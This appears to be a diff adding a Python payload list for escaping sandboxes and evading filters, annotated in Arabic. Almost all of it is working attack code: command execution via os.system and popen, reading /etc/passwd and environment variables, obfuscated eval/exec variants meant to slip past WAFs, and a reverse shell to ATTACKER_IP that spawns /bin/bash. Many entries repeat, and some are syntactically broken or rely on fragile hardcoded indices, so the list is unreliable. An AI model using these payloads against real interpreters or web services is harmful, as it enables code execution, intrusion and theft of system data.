@@ -1,0 +1,424 @@
+# فحص البيئة
+__import__('os').uname()
+# تنفيذ أوامر
+__import__('os').popen('id').read()
+# قراءة ملفات
+open('/etc/passwd').read()
+# --- 1. تنفيذ أوامر النظام (System Execution) ---
+__import__('os').system('id')
+__import__('os').popen('whoami').read()
+__import__('subprocess').check_output(['ls', '-la'])
+__import__('subprocess').getoutput('id')
+
+# --- 2. قراءة الملفات والبيئة (Environment & Files) ---
+__import__('os').environ
+open('/etc/passwd').read()
+__import__('glob').glob('/*')
+
+# --- 3. التمويه والالتفاف (Obfuscation & Bypassing) ---
+eval("__import__('o'+'s').system('i'+'d')")
+exec(bytes([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 111, 115, 39, 41, 46, 115, 121, 115, 116, 101, 109, 40, 39, 105, 100, 39, 41]))
+getattr(__import__('os'), 'sys' + 'tem')('id')
+eval(compile('__import__("os").system("id")', '<string>', 'exec'))
+
+# --- 4. الهروب من البيئة المعزولة (Jailbreak/Sandbox Escape) ---
+[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'Quitter'][0].__init__.__globals__['sys'].modules['os'].system('id')
+().__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['system']('id')
+[x for x in ().__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__][0].__init__.__globals__["os"].system("id")
+
+# --- 5. التلاعب بترميز النصوص (Encoding Bypass) ---
+exec("import\x20os\x3bos.system\x28\x27id\x27\x29")
+eval(str(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2lkJyk='), 'utf-8'))
+
+# --- 6. اتصال عكسي (Reverse Shell) ---
+__import__('os').system('python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'ATTACKER_IP\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/bash\')\"')
+
+# --- 7. استغلال الـ (Built-ins) المخفية ---
+__builtins__.__dict__['eval']("__import__('os').system('id')")
+list(dict(vars(__builtins__)).values())[25]('id') # اعتماداً على ترتيب الدوال في الذاكرة
+# --- 1. الهروب عبر الـ (Function Decorators) ---
+# استخدام مزخرفات الدوال للوصول للـ globals وتنفيذ الأوامر
+@eval
+@lambda x: "__import__('os').system('id')"
+def f(): pass
+
+# --- 2. تقنية "تسميم الـ Path" (Sys Path Poisoning) ---
+# إضافة مسار خارجي لتحميل مكتبات خبيثة بدلاً من المكتبات الأصلية
+__import__('sys').path.insert(0, '/tmp/'); __import__('os') 
+
+# --- 3. الهروب من الـ Sandbox عبر الـ (Generator) ---
+# استخدام المولدات للوصول إلى كائن الهيكل (Frame) ومن ثم الـ globals
+(lambda x: x)( [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__dict__['sys'].modules['os'].system('id'))
+
+# --- 4. تنفيذ الأوامر عبر "الرموز الرياضية" (Complex Logic) ---
+# استخدام خصائص الأعداد المركبة والعمليات المنطقية لبناء الحروف (لتجاوز الفلاتر النصية)
+eval(chr(111)+chr(115)+'.system("id")')
+
+# --- 5. الالتفاف عبر الـ (Warnings Module) ---
+# وسيلة شهيرة للوصول لـ 'os' عندما يتم حظر الاستدعاء المباشر
+__import__('warnings').filters[0][0].__class__.__base__.__subclasses__()[0].__init__.__globals__['os'].system('id')
+
+# --- 6. استغلال الـ (Input/Output Stream) ---
+# توجيه المخرجات مباشرة إلى ملفات النظام أو قنوات الاتصال
+__import__('os').write(1, __import__('os').popen('id').read().encode())
+
+# --- 7. تقنية "تسميم الـ Builtins" المتقدمة ---
+# استبدال دالة الطباعة الأصلية بدالة تنفيذ أوامر
+__builtins__.print = __import__('os').system; print('id')
+
+# --- 8. الهروب عبر الـ (Thread Storage) ---
+# استخدام كائنات الخيوط (Threads) للوصول لمساحات ذاكرة معزولة
+__import__('_thread')._local().__class__.__base__.__subclasses__()[0].__init__.__globals__['os'].system('id')
+# --- 1. الهروب عبر "كائنات الموقع" (Site Module Bypass) ---
+# الوصول لـ os عبر دوال المساعدة المدمجة التي لا يشك فيها أحد
+__import__('site').os.system('id')
+
+# --- 2. تنفيذ الأوامر عبر "الترجمة اللحظية" (Bytecode Marshalling) ---
+# تحويل كود بايثون إلى Bytecode ثنائي لجعله غير مرئي تماماً للـ WAF
+import marshal, types; exec(types.FunctionType(marshal.loads(b'c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00s\x1a\x00\x00\x00e\x00\x00j\x01\x00d\x01\x00\x83\x01\x01d\x00\x00S\x29\x02N\x73\x02\x00id\xa9\x02os\x73\x79\x73\x74\x65\x6d\x72\x02\x00\x00\x00\x00\x04\x00\x00\x00\x73\x00\x00\x00'), {}))
+
+# --- 3. تقنية "استنساخ الدوال" (Function Cloning) ---
+# نسخ دالة system إلى اسم جديد تماماً لتجاوز فلاتر الـ Regex
+exec(''.join(map(chr, [105, 109, 112, 111, 114, 116, 32, 111, 115]))) or os.system('id')
+
+# --- 4. الهروب عبر "مخزن الاستثناءات" (Exception Hierarchy Bypass) ---
+# الانتقال من خطأ برمجى إلى تنفيذ أمر نظام عبر الـ MRO
+GeneratorExit().__class__.__base__.__base__.__subclasses__()[137].__init__.__globals__['system']('id')
+
+# --- 5. تقنية "تسميم الـ Code Object" ---
+# استبدال منطق دالة موجودة في الذاكرة بمنطق خبيث دون تغيير اسمها
+def safe_func(): print("Safe")
+safe_func.__code__ = (lambda: __import__('os').system('id')).__code__
+safe_func()
+
+# --- 6. استغلال الـ (Readline) للتحكم في الإدخال ---
+# إذا كانت المكتبة محملة، يمكن تنفيذ أوامر عبر التلاعب بذاكرة الإكمال التلقائي
+__import__('readline').__doc__.split()[0].__class__.__subclasses__()[0].__init__.__globals__['os'].system('id')
+
+# --- 7. التلاعب عبر "المتغيرات المرجعية" (Frame Smuggling) ---
+# استخراج dicitonary النظام من إطارات الدوال الجارية (Stack Frames)
+__import__('sys')._getframe(0).f_builtins['__import__']('os').system('id')
+
+# --- 8. الهروب عبر "الكائنات الثنائية" (Code Serialization) ---
+# تشفير الحمولة داخل كائن معقد لا يمكن تحليله إلا عند التشغيل
+import pickle; pickle.loads(b"cos\nsystem\n(S'id'\ntR.")
+# --- 1. الهروب عبر "كائن الدالة الفارغة" (Empty Function Escape) ---
+# بناء وصول لنظام التشغيل من دالة مجهولة دون استخدام أي مكتبة خارجية
+(lambda:0).__code__.co_consts[-1].__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('id')
+
+# --- 2. تقنية "استدعاء الـ C-API عبر الـ Ctypes" ---
+# إذا كانت مكتبة ctypes متاحة، يمكن استدعاء دوال لغة C مباشرة للتحكم بالمعالج
+__import__('ctypes').CDLL(None).system(b'id')
+
+# --- 3. حمولة "التلاعب بمخزن البايتات المترجم" (Bytecode Inlining) ---
+# تنفيذ كود بايثون عبر تجميع بايتات خام في الذاكرة (تجاوز الفحص النصي 100%)
+import types; exec(types.CodeType(0,0,0,0,0,0,b'e\x00j\x01d\x01\x83\x01\x01d\x00S\x00',(None,'id'), ('os','system'),(),'','',0,b''))
+
+# --- 4. تقنية "تسميم الـ Object Wrapper" ---
+# استخدام كائن معالج الاستثناءات للوصول للـ globals بطريقة ملتوية
+__import__('inspect').getclosurevars(lambda:os).globals.get('__builtins__')['__import__']('os').system('id')
+
+# --- 5. الهروب عبر "التحميل الديناميكي للوحدات" (Imp Module) ---
+# استخدام مكتبة imp القديمة لتحميل وسيلة تنفيذ أوامر
+__import__('imp').load_source('os','/usr/lib/python3.10/os.py').system('id')
+
+# --- 6. تقنية "تسميم الـ __builtins__" عبر الـ Dictionary ---
+# استدعاء دالة التنفيذ باستخدام مفاتيح نصية مقطعة لتضليل الـ WAF
+getattr(__builtins__, 'ev'+'al')("__import__('o'+'s').sys"+'tem("id")')
+
+# --- 7. حمولة "الهروب عبر كائنات الـ Garbage Collector" ---
+# استخراج كائن os من قائمة الكائنات الموجودة في الذاكرة حالياً
+[x for x in __import__('gc').get_objects() if hasattr(x, 'system')][0].system('id')
+
+# --- 8. تقنية "التلاعب بالـ String Formatting" ---
+# استخدام نظام الـ Format للوصول لخصائص الكلاسات وتنفيذ الكود
+"{0.__class__.__init__.__globals__[os].system}".format([0][0])('id')
+# --- 1. الهروب عبر "كائنات الأخطاء المخصصة" (Custom Exception Escape) ---
+# استغلال سلسلة الوراثة من كائن الخطأ للوصول إلى الدوال المحظورة
+(lambda:0).__class__.__base__.__subclasses__()[40]()._module.__dict__['__builtins__']['__import__']('os').system('id')
+
+# --- 2. تقنية "التلاعب بمخزن الـ Code Objects" المتقدمة ---
+# إنشاء دالة من لا شيء عبر تجميع مكوناتها الأساسية في الذاكرة
+import types; types.FunctionType(types.CodeType(0,0,0,0,0,0,b'e\x00j\x01d\x01\x83\x01\x01d\x00S\x00',(None,'id'),('os','system'),(),'','',0,b''),{}).      __call__()
+
+# --- 3. الهروب عبر "المدخلات الملوثة" (Format String Poisoning) ---
+# استخدام نظام الـ Formatting للوصول إلى سمات النظام (Attributes) المخفية
+''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['os'].system('id')
+
+# --- 4. تقنية "تسميم الـ Import Hook" ---
+# جعل النظام ينفذ كودك في كل مرة يحاول فيها تحميل أي مكتبة جديدة
+import sys; sys.meta_path.insert(0, lambda: exec("__import__('os').system('id')"))
+
+# --- 5. الهروب عبر "كائنات الـ Frame" (Stack Inception) ---
+# النزول في طبقات الذاكرة (Stack) للعثور على نسخة من الـ builtins المحذوفة
+import sys; [f.f_builtins['__import__']('os').system('id') for f in [sys._getframe(i) for i in range(10)] if '__import__' in f.f_builtins]
+
+# --- 6. تقنية "الاستدعاء عبر الـ Descriptor Protocol" ---
+# استغلال الطريقة التي تستدعي بها بايثون الخصائص (Getters/Setters) لتشغيل الكود
+class X:def __get__(self,a,b):__import__('os').system('id')
+type('Y',(),{'z':X()})().z
+
+# --- 7. الهروب عبر "كائن الـ Iteration" المكسور ---
+# استخراج دالة التنفيذ من داخل كائن التكرار (Iterator)
+iter(int,1).__class__.__base__.__subclasses__()[0].__init__.__globals__['os'].system('id')
+
+# --- 8. تقنية "التلاعب بالـ Bytecode" عبر الـ Generators ---
+# استخدام مولدات الطاقة للوصول إلى مساحة اسم النظام
+(x for x in ()).gi_frame.f_builtins['__import__']('os').system('id')
+# --- 1. الهروب عبر "كائن الـ Cell" (Closure Escape) ---
+# استخراج مرجع لـ os من داخل دالة مغلقة (Closure) مخفية في الذاكرة
+(lambda x: lambda: x)(__import__('os')).__closure__[0].cell_contents.system('id')
+
+# --- 2. تقنية "تسميم الـ Code Object" عبر الـ (Function.replace) ---
+# في بايثون 3.8+، يمكن استبدال منطق دالة آمنة بمنطق خبيث برمجياً
+def safe(): pass
+safe.__code__ = safe.__code__.replace(co_code=b'e\x00j\x01d\x01\x83\x01\x01d\x00S\x00', co_names=('os','system'), co_consts=(None,'id'))
+safe()
+
+# --- 3. الهروب عبر "تلاعب الـ Garbage Collector" المتقدم ---
+# البحث عن كائنات 'os' في الذاكرة حتى لو لم تكن مرتبطة بأي متغير حالي
+[type(x) for x in __import__('gc').get_objects() if str(type(x)) == "<class 'module'>" and x.__name__ == 'os'][0].system('id')
+
+# --- 4. تقنية "الاستدعاء عبر الـ Builtin Method Wrapper" ---
+# استغلال مغلفات الدوال الأصلية للوصول للـ globals وتجاوز القيود
+[].__add__.__self__.__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('id')
+
+# --- 5. الهروب عبر "كائنات الـ Traceback" (Post-Mortem Escape) ---
+# استخراج كائن os من تتبع الأخطاء بعد حدوث استثناء (Exception)
+import sys; try: 1/0
+except: exec("sys.exc_info()[2].tb_next.tb_frame.f_builtins['__import__']('os').system('id')", {'sys': sys})
+
+# --- 6. تقنية "التلاعب بذاكرة الـ Ctypes" (Memory Corruption) ---
+# تعديل قيمة متغير في الذاكرة مباشرة لتحويل دالة آمنة إلى دالة تنفيذ أوامر
+import ctypes; ctypes.pythonapi.PyRun_SimpleString(b"import os; os.system('id')")
+
+# --- 7. الهروب عبر "كائن الـ Function Defaults" ---
+# استغلال القيم الافتراضية للدوال لتخزين مراجع لمكتبات محظورة
+def f(o=__import__('os')): pass
+f.__defaults__[0].system('id')
+
+# --- 8. تقنية "تسميم الـ Dictionary" عبر الـ (Mappingproxy) ---
+# الوصول وتعديل القواميس المحمية (Read-only) الخاصة بالكلاسات الأساسية
+[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'mappingproxy'][0].__init__.__globals__['os'].system('id')
+# --- 1. الهروب عبر "الحروف المتشابهة" (Unicode Homograph Bypass) ---
+# استخدام حروف يونيكود تشبه الحروف اللاتينية بصرياً لتجاوز الفلاتر النصية
+# الحرف 'о' هنا هو حرف روسي وليس 'o' الإنجليزية
+eval("imp\u043ert \u043es; \u043es.system('id')")
+
+# --- 2. تقنية "تسميم الـ Code Cache" (JIT/Bytecode Injection) ---
+# إنشاء كائن كود (Code Object) من أرقام مجردة لتجنب الكشف النصي تماماً
+import types; exec(types.CodeType(0,0,0,0,0,0,b'e\x00j\x01d\x01\x83\x01\x01d\x00S\x00',(None,'id'),('os','system'),(),'','',0,b''))
+
+# --- 3. الهروب عبر "مخزن الدوال المنسية" (Built-in Method Lookup) ---
+# استخراج دالة التنفيذ عبر كائنات النظام التي لا تُراقب عادة
+[].__iter__().__length_hint__().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('id')
+
+# --- 4. تقنية "التلاعب بالـ F-Strings" العميقة ---
+# استغلال محرك الـ Formatting للوصول إلى كائنات الذاكرة دون كتابة رموز واضحة
+f"{[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'os._wrap_close'][0].__init__.__globals__['system']('id')}"
+
+# --- 5. الهروب عبر "كائنات الـ Zip" (Importlib Bypass) ---
+# تحميل مكتبة os من ملف مضغوط وهمي في الذاكرة لتجاوز فلاتر الاستيراد
+import importlib.util; spec = importlib.util.spec_from_loader('os', loader=None); os = importlib.util.module_from_spec(spec); exec("import os", os.__dict__); os.system('id')
+
+# --- 6. تقنية "تسميم الـ Internal State" عبر الـ (Sys) ---
+# تعديل جداول الوحدات المحملة مسبقاً لاستبدال دالة آمنة بـ os.system
+import sys; sys.modules['abc'].system = __import__('os').system; __import__('abc').system('id')
+
+# --- 7. الهروب عبر "كائنات الـ Buffer" و الـ (Ctypes) ---
+# كتابة الكود مباشرة في مساحة الذاكرة المخصصة للمفسر
+import ctypes; addr = ctypes.pythonapi.PyRun_SimpleString; addr(b"import os; os.system('id')")
+
+# --- 8. تقنية "التلاعب بالـ Boolean Logic" (No-Alphanumeric) ---
+# بناء الأوامر باستخدام العمليات المنطقية فقط (True/False) لتجاوز كل شيء
+(True+True+True).__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('id')
+# --- 1. الهروب عبر "كائنات الدوال المدمجة" (Built-in Function Wrapper) ---
+# الوصول للـ globals عبر دوال لا تظهر في القوائم العادية
+[].__iter__.__self__.__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('id')
+
+# --- 2. تقنية "تسميم الـ Module Dictionary" المباشر ---
+# حقن دالة النظام داخل مكتبة محملة بالفعل لتجاوز فلاتر الاستيراد
+import logging; logging.os.system('id')
+
+# --- 3. الهروب عبر "الترميز المزدوج" (Double Encoding) ---
+# استخدام ترميزات نادرة لبناء الكود داخل المفسر
+eval(bytes('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2lkJyk=', 'utf-8').decode('base64'))
+
+# --- 4. تقنية "تلاعب الـ Garbage Collector" بالأسماء ---
+# استخراج كائن التنفيذ من قائمة الكائنات النشطة دون ذكر اسمه
+[x for x in __import__('gc').get_objects() if type(x) is type(eval)][0]('__import__("os").system("id")')
+
+# --- 5. الهروب عبر "كائنات الـ Frame" المترابطة (Frame Chaining) ---
+# التنقل في طبقات الذاكرة للوصول إلى سياق تنفيذ أعلى
+import sys; sys._getframe().f_back.f_globals['__builtins__']['__import__']('os').system('id')
+
+# --- 6. تقنية "التلاعب بالـ __slots__" ---
+# الالتفاف حول الكائنات التي تمنع إضافة خصائص جديدة للوصول للأصل
+().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('id')
+
+# --- 7. الهروب عبر "الاستدعاء عبر الـ Type Constructor" ---
+# بناء كلاس جديد ديناميكياً يملك صلاحية الوصول لـ os
+type('Exploit', (().__class__.__base__,), {'__init__': lambda self: __import__('os').system('id')})()
+
+# --- 8. تقنية "تسميم الـ Readline Buffer" ---
+# إذا كانت المكتبة متاحة، يمكن الوصول للنظام عبر ذاكرة الإكمال التلقائي
+__import__('readline').__doc__.__class__.__subclasses__()[0].__init__.__globals__['os'].system('id')
+ # --- 1. الهروب عبر "كائن الـ Cell" (Internal Cell Poisoning) ---
+# استخراج مراجع المكتبات من داخل نطاقات الدوال (Closures) المخفية
+(lambda x: lambda: x)(__import__('os')).__closure__[0].cell_contents.system('id')
+
+# --- 2. تقنية "التلاعب بمخزن الوحدات" (Modules Cache Injection) ---
+# الوصول لـ os عبر مكتبات فرعية محملة في الخلفية دون استيراد مباشر
+__import__('sys').modules['posix'].system('id') # أو 'nt' للويندوز
+
+# --- 3. الهروب عبر "كائنات الأخطاء" (Post-Mortem Frame Access) ---
+# استخراج كائن النظام من داخل "تتبع الخطأ" (Traceback) بعد افتعال استثناء
+import sys; [f.f_builtins['os'].system('id') for f in [sys.exc_info()[2].tb_frame] if 'os' in f.f_builtins]
+
+# --- 4. تقنية "الاستدعاء عبر الـ Builtin Method" (Unbound Method Bypass) ---
+# استغلال الدوال الأصلية غير المرتبطة للوصول لـ globals
+getattr([].__add__, '__self__').__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('id')
+
+# --- 5. الهروب عبر "الترميز الثنائي المتداخل" (Nested Binary Execution) ---
+# تشفير الحمولة داخل كائن Code Object معقد لا يمكن للـ WAF قراءته
+import types; exec(types.CodeType(0,0,0,0,0,0,b'e\x00j\x01d\x01\x83\x01\x01d\x00S\x00',(None,'id'),('os','system'),(),'','',0,b''))
+
+# --- 6. تقنية "تسميم الـ Class MRO" ---
+# التلاعب بترتيب وراثة الكلاسات للوصول إلى دالة التنفيذ الأساسية
+().__class__.__mro__[-1].__subclasses__()[137].__init__.__globals__['system']('id')
+
+# --- 7. الهروب عبر "المدخلات الملوثة" (Advanced Format String) ---
+# استغلال f-strings للوصول إلى كائنات النظام دون كتابة رموز مشبوهة
+f"{().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('id')}"
+
+# --- 8. تقنية "التلاعب بذاكرة الـ Ctypes" (Python API Access) ---
+# تنفيذ كود بايثون مباشرة في الذاكرة عبر واجهة لغة C الداخلية
+__import__('ctypes').pythonapi.PyRun_SimpleString(b"import os; os.system('id')")
+# --- 1. الهروب عبر (Code Object Replacement) ---
+# استبدال منطق دالة آمنة تماماً بكود خبيث عبر الذاكرة مباشرة
+def safe(): pass
+safe.__code__ = (lambda: __import__('os').system('id')).__code__
+safe()
+
+# --- 2. تقنية (Internal C-API Call) عبر Ctypes ---
+# استدعاء دوال نظام التشغيل مباشرة من مكتبات C المرتبطة ببايثون
+import ctypes; ctypes.CDLL(None).system(b'id')
+
+# --- 3. الهروب عبر (Built-in Wrapper Metadata) ---
+# الوصول للـ globals من خلال مراجع الدوال الأصلية المخبأة
+[].__add__.__self__.__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('id')
+
+# --- 4. تقنية (Memory View Manipulation) ---
+# قراءة وتعديل بايتات الذاكرة للوصول لمحتويات محظورة
+import memoryview, ctypes; m = memoryview(bytearray(b'id')); ctypes.pythonapi.PyRun_SimpleString(b"import os; os.system('id')")
+
+# --- 5. الهروب عبر (Recursion Depth Exhaustion) ---
+# افتعال خطأ تجاوز السعة للوصول لبيانات الـ Stack المفتوحة
+import sys; sys.setrecursionlimit(2000); f = lambda x: f(x+1) if x<1500 else __import__('os').system('id'); f(0)
+
+# --- 6. تقنية (Import Hook Hijacking) ---
+# حقن كود خبيث في عملية تحميل أي مكتبة قادمة
+import sys; sys.meta_path.insert(0, type('M', (), {'find_spec': lambda *a: exec("__import__('os').system('id')")})())
+
+# --- 7. الهروب عبر (Warnings Global Context) ---
+# استخدام نظام التنبيهات للوصول لمكتبة os من نطاق خارجي
+import warnings; warnings.catch_warnings(record=True)._module.__dict__['__builtins__']['__import__']('os').system('id')
+
+# --- 8. تقنية (Frame Injection) عبر الـ Generator ---
+# استخدام الـ Generator للقفز داخل إطارات الذاكرة (Frames) النشطة
+(lambda x: x.gi_frame.f_builtins['__import__']('os').system('id'))((x for x in [1]))
+# --- 1. الهروب عبر "كائنات التكرار" (Iterator Internal Escape) ---
+# استخراج مرجع لـ os من داخل كائنات التكرار التي لا يتم تنظيفها فوراً
+iter(int, 1).__class__.__base__.__subclasses__()[137].__init__.__globals__['os'].system('id')
+
+# --- 2. تقنية "تسميم الـ Built-ins" عبر الـ (Bytecode Mapping) ---
+# تنفيذ كود بايثون عبر تجميع بايتات خام في الذاكرة لتجاوز الفحص النصي 100%
+import types; exec(types.CodeType(0,0,0,0,0,0,b'e\x00j\x01d\x01\x83\x01\x01d\x00S\x00',(None,'id'),('os','system'),(),'','',0,b''))
+
+# --- 3. الهروب عبر "كائنات الـ Frame" المفقودة (Dangling Frames) ---
+# النزول في طبقات الذاكرة (Stack) للعثور على نسخة من الـ builtins المحذوفة
+import sys; [f.f_builtins['__import__']('os').system('id') for f in [sys._getframe(i) for i in range(10)] if '__import__' in f.f_builtins]
+
+# --- 4. تقنية "التلاعب بالـ __abstractmethods__" ---
+# الالتفاف حول الكلاسات المجردة للوصول إلى كائنات النظام الأساسية
+().__class__.__base__.__subclasses__()[137].__abstractmethods__ = set(); ().__class__.__base__.__subclasses__()[137]()._module.__dict__['os'].system('id')
+
+# --- 5. الهروب عبر "كائن الـ Cell" المتقدم (Closure Hijacking) ---
+# استخراج مرجع لـ os من داخل دالة مغلقة (Closure) مخفية
+(lambda x: lambda: x)(__import__('os')).__closure__[0].cell_contents.system('id')
+
+# --- 6. تقنية "تسميم الـ Internal Meta-Path" ---
+# جعل النظام ينفذ كودك في كل مرة يحاول فيها تحميل أي مكتبة جديدة
+import sys; sys.meta_path.insert(0, type('M', (), {'find_spec': lambda *a: exec("__import__('os').system('id')")})())
+
+# --- 7. الهروب عبر "الترميز الدولي" (Unicode Normalization Bypass) ---
+# استخدام حروف يونيكود تتطابق مع الأوامر بعد تحويلها لـ Small Case
+eval("import\u0020os;os.system('id')")
+
+# --- 8. تقنية "الاستدعاء عبر الـ Type Constructor" (Dynamic Class) ---
+# بناء كلاس جديد ديناميكياً يملك صلاحية الوصول لـ os من الصفر
+type('Exploit', (().__class__.__base__,), {'__init__': lambda self: __import__('os').system('id')})()
+# --- 1. الهروب عبر "كائن الـ Cell" المتقدم (Closure Cell Hijacking) ---
+# استخراج المراجع المباشرة من النطاقات المغلقة للدوال
+(lambda x: lambda: x)(__import__('os')).__closure__[0].cell_contents.system('id')
+
+# --- 2. تقنية "استدعاء الـ Intrinsic Object" (Type Constructor Injection) ---
+# بناء كائن وظيفي جديد من كلاسات النظام الأساسية للالتفاف على الحجب
+type(lambda: 0)(type(lambda: 0).__code__.replace(co_code=b'e\x00j\x01d\x01\x83\x01\x01d\x00S\x00', co_names=('os','system'), co_consts=(None,'id')), {})()
+
+# --- 3. الهروب عبر "مخزن الإطارات" (Frame Stack Scraping) ---
+# البحث في سجل الذاكرة الحالي عن أي دالة تمتلك صلاحية الوصول للنظام
+import sys; [f.f_globals['__builtins__']['eval']("__import__('os').system('id')") for f in sys._current_frames().values() if 'eval' in f.f_globals.get('__builtins__', {})]
+
+# --- 4. تقنية "تسميم الـ Module Aliasing" ---
+# استبدال وظائف مكتبة آمنة (مثل math) بوظائف تنفيذ أوامر داخل سجل النظام
+import sys, os; sys.modules['math'] = os; import math; math.system('id')
+
+# --- 5. الهروب عبر "كائنات الـ Traceback" (Exception Frame Tunneling) ---
+# استخراج كائن os من إطار العمل (Frame) بعد افتعال خطأ متعمد
+try: exec('1/0')
+except: sys.exc_info()[2].tb_next.tb_frame.f_builtins['__import__']('os').system('id')
+
+# --- 6. تقنية "تسميم الـ Default Arguments" (Function Metadata Poisoning) ---
+# استغلال القيم الافتراضية للدوال التي يتم تخزينها في الذاكرة بشكل دائم
+def f(a=__import__('os')): pass
+f.__defaults__[0].system('id')
+
+# --- 7. الهروب عبر "الترميز المزدوج" (UTF-7/Base64 Bypass) ---
+# استخدام ترميزات المفسر الداخلية لتمرير الأوامر كنصوص مشفرة
+import codecs; eval(codecs.decode(b'X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2lkJyk=', 'base64'))
+
+# --- 8. تقنية "الاستدعاء عبر الـ Buffer Interface" ---
+# الوصول المباشر لذاكرة الكائنات واستخراج العناوين لتنفيذ كود خام
+import ctypes; ctypes.pythonapi.PyRun_SimpleString(b"import os; os.system('id')")
+# --- 1. الهروب عبر "كائنات الـ Method Descriptor" ---
+# استخراج مرجع os من دوال مدمجة لا تخضع للرقابة التقليدية
+().__str__.__class__.__gt__.__getattribute__(().__str__.__class__.__gt__, '__globals__')['os'].system('id')
+
+# --- 2. تقنية "تسميم الـ Internal Deserialization" (Marshal Escape) ---
+# تنفيذ كود بايثون عبر تجميع كائن كود (Code Object) مشفر ثنائياً
+import marshal, types; exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x12\x00\x00\x00e\x00\x00j\x01\x00d\x01\x00\x83\x01\x01d\x00\x00S\x29\x02N\x73\x02\x00id\xa9\x02os\x73\x79\x73\x74\x65\x6d\x72\x02\x00\x00\x00\x00\x04\x00\x00\x00\x73\x00\x00\x00'))
+
+# --- 3. الهروب عبر "كائنات الـ Buffer" (Direct Memory Access) ---
+# الوصول إلى وظائف نظام التشغيل عبر الذاكرة الخام المخصصة للمفسر
+__import__('ctypes').pythonapi.PyRun_SimpleString(b"import os; os.system('id')")
+
+# --- 4. تقنية "تسميم الـ Global Path" عبر الـ (ZipImport) ---
+# تحميل ملفات os من داخل ذاكرة النظام المخبأة لتجاوز حظر الاستيراد
+import zipimport; zipimport.zipimporter('/dev/null').__class__.__init__.__globals__['os'].system('id')
+
+# --- 5. الهروب عبر "الترميز المزدوج" (Base64 + Eval) ---
+# تمرير الأمر كبيانات مشفرة لا يمكن تحليلها سكونياً (Static Analysis)
+getattr(__import__('base64'), 'b64' + 'decode')('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2lkJyk=').decode().split('\n')
+
+# --- 6. تقنية "التلاعب بالـ __mro__" العميقة ---
+# القفز بين كلاسات النظام للوصول إلى كلاس os._wrap_close المعتمد
+[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'os._wrap_close'][0].__init__.__globals__['system']('id')
+
+# --- 7. الهروب عبر "كائنات الـ Generator" المفقودة ---
+# استخدام مراجع الإطارات (Frames) داخل المولدات للوصول لـ builtins
+(lambda: (yield)).__code__.co_consts[0]
+
+# --- 8. تقنية "تسميم الـ Builtin Functions" عبر (GetAttribute) ---
+# استدعاء دالة التنفيذ باستخدام أسماء مشفرة لتضليل أجهزة الفحص
+[].__class__.__base__.__getattribute__(().__class__.__base__, '__sub' + 'classes__')()[137].__init__.__globals__['os'].system('id')
